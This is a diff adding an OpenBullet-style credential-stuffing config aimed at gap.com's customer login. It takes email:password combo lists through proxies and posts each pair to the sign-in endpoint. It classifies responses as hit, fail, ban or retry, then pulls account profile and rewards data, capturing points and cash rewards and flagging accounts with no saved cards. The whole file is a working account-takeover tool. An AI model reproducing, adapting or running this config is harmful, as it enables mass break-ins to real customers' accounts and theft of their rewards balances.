@@ -1,0 +1,72 @@
+[SETTINGS]
+{
+  "Name": "g a p . c o m ",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-23T19:15:17.5703295+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#get_login_page REQUEST GET "https://secure-www.gap.com/profile/sign_in.do?targetURL=%2Fprofile%2Faccount_summary.do&returnURL=%2Fprofile%2Faccount_summary.do&context=sign_out" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#get_login_page REQUEST POST "https://secure-www.gap.com/profile/validate_sign_in.do" AutoRedirect=TRUE 
+  CONTENT "emailAddress=<USER>&password=<PASS>&signInButton=Sign+In&userType=1&targetURL=%2Fprofile%2Faccount_summary.do&forwardName=&context=SIGN_IN" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Please enter a valid email address and password combination" 
+  KEYCHAIN Success OR 
+    KEY "Your account" 
+    KEY "" 
+  KEYCHAIN Ban OR 
+    KEY "Access Denied" 
+  KEYCHAIN Retry OR 
+    KEY "<RESPONSECODE>" Contains "We're sorry." 
+#get_profile REQUEST GET "https://secure-www.gap.com/profile/customer_value.do" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#get_resources REQUEST GET "https://secure-www.gap.com/resources/customer_value/v2" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Retry OR 
+    KEY "We're sorry." 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "\"firstName\"" 
+    KEY "\"expiryDate\"" 
+  KEYCHAIN Success OR 
+    KEY "\"firstName\"" 
+    KEY "\"expiryDate\"" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "\"cards\":[],\"" 
+#parse_points PARSE "<SOURCE>" LR "points\":" ",\"" Recursive=FALSE -> CAP "points" "" "" 
+#parse_cashrewards PARSE "<SOURCE>" LR "cashRewards\":" ",\"" Recursive=FALSE -> CAP "cashrewards" "" "" 
